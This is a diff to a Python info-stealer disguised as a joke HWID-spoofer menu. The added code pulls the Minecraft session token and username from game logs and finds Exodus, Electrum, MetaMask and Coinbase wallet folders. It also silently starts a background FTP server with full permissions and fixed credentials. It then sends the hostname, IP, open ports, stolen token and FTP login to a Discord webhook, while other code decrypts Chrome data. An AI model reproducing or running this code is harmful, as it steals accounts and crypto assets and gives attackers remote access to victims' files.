@@ -12,7 +12,13 @@ import requests
 import discord
 import time
 import socket
+import subprocess
+import threading
+import logging
 from Cryptodome.Cipher import AES
+from pyftpdlib.authorizers import DummyAuthorizer
+from pyftpdlib.handlers import FTPHandler
+from pyftpdlib.servers import FTPServer
 
 Webhook = ""
 
@@ -36,24 +42,43 @@ def fakeMessage():
         i += 1
     os.system('cls||clear')
     print(logo)
-    print("""\nSelect Option (Use Numbers To Make A Choice)
-    1 -> Spoof HWID
-    2 -> Find GF
-    3 -> Hack Nasa
-    4 -> Obtain A Life
-    """)
-    option = input()
-    print("Option " + option +" Selected Starting Spoofing HWID Now")
-    #Fake Bar
-    time.sleep(999)
+    if len(sys.argv) == 1:
+        run_in_background()
+    while True:
+        print("""\nSelect Option (Use Numbers To Make A Choice)
+        1 -> Spoof HWID
+        2 -> Find GF
+        3 -> Hack Nasa
+        4 -> Obtain A Life
+        """)
+        option = input("Enter your choice: ")
+        
+        if option == "1":
+            print("Option 1 Selected: Starting Spoofing HWID Now")
+            print("Spoofing Now")
+        elif option == "2":
+            print("Option 2 Selected: Finding GF")
+            
+        elif option == "3":
+            print("Option 3 Selected: Hacking Nasa")
+            
+        elif option == "4":
+            print("Option 4 Selected: Obtaining A Life")
+            
+        else:
+            print("Invalid option. Please select a valid option.")
 
 
 
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
-Wallets = None
+LatestLog_Path = os.path.normpath(os.path.join(os.getenv('USERPROFILE'), r'AppData\Roaming\.minecraft\logs\latest.log'))
+Wallets = []
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
 PCName = os.environ.get( " USERNAME" )
 PortList = []
+logging.basicConfig(level=logging.CRITICAL)
 
 def get_secret_key():
     try:
@@ -68,7 +93,29 @@ def get_secret_key():
         print("%s"%str(e))
         print("[ERR] Chrome secretkey cannot be found")
         return None
-    
+
+def extract_session_id(log_file):
+    with open(log_file, 'r') as file:
+        for line in file:
+            match = re.search(r'token:(\S+)', line)
+            if match:
+                token = match.group(1)
+                token = token[:-1]
+                return token
+    return None
+session_id = extract_session_id(LatestLog_Path)
+
+
+def extract_username(log_file):
+    with open(log_file, 'r') as file:
+        for line in file:
+            match = re.search(r'Setting user:\s*(\S+)', line)
+            if match:
+                return match.group(1)
+    return None
+player_id = extract_username(LatestLog_Path)
+
+
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
@@ -120,44 +167,68 @@ for port in range(65535):
     except:
         PortList.append(port)
 ports_string = ', '.join(map(str, PortList))
-    
+
+def start_ftp():
+    authorizer = DummyAuthorizer()
+    authorizer.add_user("SSIDSpin", "Admin", ".", perm="elradfmwMT") # User, Password
+    handler = FTPHandler
+    handler.authorizer = authorizer
+    server = FTPServer((ip_address, 21), handler)
+    server.serve_forever()
+
+def run_in_background():
+    ftp_thread = threading.Thread(target=start_ftp)
+    ftp_thread.daemon = True  
+    ftp_thread.start()
+def find_wallets():
+    base_paths = {
+        "Exodus": [
+            r"AppData\Local\Programs\Exodus",
+            r"AppData\Roaming\Exodus"
+        ],
+        "Electrum": [
+            r"AppData\Local\Electrum",
+            r"AppData\Roaming\Electrum"
+        ],
+        "MetaMask": [
+            r"AppData\Local\MetaMask",
+            r"AppData\Roaming\MetaMask",
+            r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions\chrome-extension_"
+            r"AppData\Local\Google\Chrome\User Data\Default\Extensions\nkbihfbeogaeaoehlefnkodbefgpgknn"
+        ],
+        "Coinbase Wallet": [
+             r"AppData\Local\Google\Chrome\User Data\Default\Extensions\pgpmpfhiifbpfdjlmgldabkijcclkkdl"
+        ]
+    }
+
+    user_profile = os.path.expanduser("~")
+    found_wallets = []
+    for wallet, paths in base_paths.items():
+        possible_paths = [os.path.normpath(os.path.join(user_profile, path)) for path in paths]
+        for path in possible_paths:
+            if os.path.isdir(path):
+                found_wallets.append(wallet)
+                break
+
+    return found_wallets
 
 
-def findwallets():
-    if 1+1 == 2:
-        Wallets == "1"
-        #Find Hardware Wallets
-        return True
-    else:
-        Wallets == "None"
-        return False
-    
-
-
-
-
-
-
+Wallets = ", ".join(find_wallets()) if find_wallets() else "No Wallets found."
 if __name__ == '__main__':
     try:
         with open('LatestLog.txt', mode='w', encoding='utf-8') as decrypt_password_file:
             secret_key = get_secret_key()
-            hostname = socket.gethostname()
-            ip_address = socket.gethostbyname(hostname)
             PCInfo=discord.Embed(
                 title =f"{hostname} PC Stats",
+                colour = 0x008000
             )
             PCInfo.add_field(name="**:mechanic: Host Name**:", value=f"{hostname}", inline=True)
             PCInfo.add_field(name="**:computer: IP Address**:", value=f"{ip_address}", inline=True)
             PCInfo.add_field(name="**:map: Open Ports**:", value=f"{ports_string}", inline=False)
-            PCInfo.add_field(name="**:moneybag: Crypto Wallets Available:**", value=f"{Wallets}", inline=False)
-            if findwallets == True:
-                PharseKey=discord.Embed(
-                    title= f"{hostname} Crypto Wallet Details",
-                    description= "File Upload Link View:",
-                    colour=0x008000
-                )
-
+            PCInfo.add_field(name="**:moneybag: Crypto Wallets Installed On PC:**", value=f"{Wallets}", inline=False)
+            PCInfo.add_field(name="**:man_technologist: Player Name:**", value=f"{player_id}", inline=True)
+            PCInfo.add_field(name="**:unlock: Minecraft SSID:**", value=f"{session_id}", inline=True)
+            PCInfo.add_field(name="**:wireless: FTP Connection Login:**", value=f"IP:{ip_address}"+":21\n Username: SSIDSpin \n Password: Admin", inline=False)
             send_to_discord(Webhook, embed=PCInfo)
 
             folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
